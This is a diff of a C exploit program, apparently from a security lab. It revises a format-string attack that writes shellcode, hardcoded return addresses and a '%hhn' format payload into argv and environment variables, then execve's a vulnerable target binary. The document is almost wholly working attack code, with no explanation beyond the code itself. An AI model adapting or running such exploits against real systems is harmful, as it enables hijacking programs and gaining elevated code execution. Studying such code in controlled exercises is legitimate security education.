@@ -8,46 +8,51 @@
 
 int main(void)
 {
-	char *args[3];
-	char *env[1];
+        char *args[3];
+        char *env[21];
 
-	args[0] = TARGET;
-	char exploit[256];
-	int i;
-	for (i = 0; i < 256; i++) {
-		exploit[i] = 0x01;
-	}
-	int return_add = 0x2021f94b;
-	int* ret_in_exploit = (int*) (exploit + 4);
-	*ret_in_exploit = return_add;
+        char buffer[256];
+        int i;
+        for (i = 0; i < 256; i++) {
+                buffer[i] = 0x01;
+        }
 
-	return_add = 0x2021f94a;
-	ret_in_exploit = (int*) (exploit + 12);
-	*ret_in_exploit = return_add;
+        char *return_addr[] = { "\x68\xfe\x21\x20", \
+		        	"\x69\xfe\x21\x20", \
+        			"\x6a\xfe\x21\x20", \
+				"\x6b\xfe\x21\x20" };
+        char exploit[100];
+        memcpy(exploit, shellcode, 45);
+        char formatter[] = "|%08x|%08x|%08x|%08x|%73c|%hhn|%95c|%hhn|%38c|%hhn|%253c|%hhn";
+        int fm_size = sizeof(formatter);
+        memcpy(exploit + 45, formatter, fm_size);
+        // fprintf(stdout, "%s\n", exploit);
 
-	return_add = 0x2021f948;
-	ret_in_exploit = (int*) (exploit + 20);
-	*ret_in_exploit = return_add;
-	
-	return_add = 0x2021f949;
-	ret_in_exploit = (int*) (exploit + 28);
-	*ret_in_exploit = return_add;
-	
-	char format_string[31] = "%32d%hhn%1d%hhn%3d%hhn%214d%hhn";
-	memcpy(exploit + 60, format_string, 31);
-	memcpy(exploit + 196, shellcode, 45);	
-	
-	args[1] = exploit;
-	args[2] = NULL;
-	env[0] = NULL;
-	//exploit[255] = '\0';
-	for (i = 0; i < 256; i++) {
-		printf("%c", exploit[i] & 0xff);
-		fflush(stdout);
-	}
-	
-	if (0 > execve(TARGET, args, env))
+	char junk[] = "AAAAAAA";
+        args[0] = TARGET; args[1] = return_addr[0]; args[2] = NULL;
+        env[0] = "\0";
+        env[1] = "\0";
+        env[2] = "\0";
+        env[3] = junk;
+        env[4] = return_addr[1];
+        env[5] = "\0";
+        env[6] = "\0";
+        env[7] = "\0";
+        env[8] = junk;
+        env[9] = return_addr[2];
+        env[10] = "\0";
+        env[11] = "\0";
+        env[12] = "\0";
+        env[13] = junk;
+        env[14] = return_addr[3];
+        env[15] = "\0";
+        env[16] = "\0";
+        env[17] = "\0";
+        env[18] = exploit;
+        env[19] = buffer;
+        env[20] = NULL;
+
+	if (0 > execve(TARGET, args, env))	
 		fprintf(stderr, "execve failed.\n");
-
 	return 0;
 }
